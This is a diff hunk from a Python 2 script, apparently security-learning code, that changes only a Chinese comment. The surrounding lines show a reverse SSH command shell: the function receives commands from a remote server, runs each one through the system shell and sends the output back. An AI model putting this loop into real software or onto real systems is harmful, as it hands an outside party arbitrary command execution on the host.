@@ -19,7 +19,7 @@ def ssh_command(ip, user, passwd, command, port=22):
         ssh_session.exec_command(command)  # 执行命令
         print ssh_session.recv(1024)  # 返回命令执行结果（１０２４个字符）
         while True:
-            command = ssh_session.recv(1024)  # 从ｓｓｈ服务器获取命令
+            command = ssh_session.recv(1024)  # 从ssh服务器获取命令
             try:
                 cmd_output = subprocess.check_output(command, shell=True)
                 ssh_session.send(str(cmd_output))
